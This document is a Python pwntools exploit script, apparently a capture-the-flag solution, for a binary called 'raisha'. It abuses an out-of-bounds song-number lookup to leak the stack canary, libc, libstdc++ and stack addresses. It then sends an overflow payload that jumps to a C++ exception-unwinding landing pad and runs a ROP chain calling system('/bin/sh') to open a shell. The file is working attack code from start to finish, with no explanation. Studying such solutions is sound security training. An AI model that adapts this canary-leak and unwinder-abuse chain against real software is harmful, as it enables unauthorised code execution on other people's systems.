#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF('./raisha')
libc = elf.libc
context.update(
    log_level='debug'
)

sla = lambda x, y: p.sendlineafter(x, y)
sa = lambda x, y: p.sendafter(x, y)
sl = lambda x: p.sendline(x)
s = lambda x: p.send(x)
rcall = lambda x: p.recvall(x)
rcud = lambda x: p.recvuntil(x, drop=True)
rcu = lambda x: p.recvuntil(x)
rcl = lambda: p.recvline(0)
rcn = lambda x: p.recv(x)
logi = lambda x, y: log.info(f'{x} = {hex(y)}')
def bleak(x): ret = unpack(x, 'all'); logi('leak', ret); return ret
def hleak(x): ret = eval(x); logi('leak', ret); return ret

def start():
    global libc
    if args.REMOTE:
        return remote(HOST, PORT)
    elif args.GDB:
        return gdb.debug([elf.path], c)
    else:
        return elf.process()

c = '''
b* vuln+130
c
b* _Unwind_RaiseException+780
c
'''

REMOTE = 'nc localhost 5000'.replace('nc ', '').split(' ')
HOST = REMOTE[0] if REMOTE else ''
PORT = int(REMOTE[1]) if len(REMOTE) > 1 else 0

p = start()

sl(b'2')
sla(b'Enter song number: ',b'11')
canary = hleak(rcl())

sl(b'2')
sla(b'Enter song number: ',b'15')
libc.address = hleak(rcl()) - 0x28150
logi('libc', libc.address)

sl(b'2')
sla(b'Enter song number: ',b'10')
base = hleak(rcl()) - 0x25a560
logi('libstdc++', base)

sl(b'2')
sla(b'Enter song number: ',b'13')
stack = hleak(rcl())
logi('stack', stack)

landing_pad = base + 0xc9481 + 1
logi('landing_pad', landing_pad)

rop = ROP(libc)
rop.call(rop.ret)
rop.system(next(libc.search(b'/bin/sh\x00')))

payload = flat({
    10 :[
        canary,
        0x1111,
        0x2222,
        stack,
        landing_pad,
        0,
        rop.chain()
    ]
})

sl(b'1')
sa(b'Enter song number: ',b'0')
sl(payload)

p.interactive()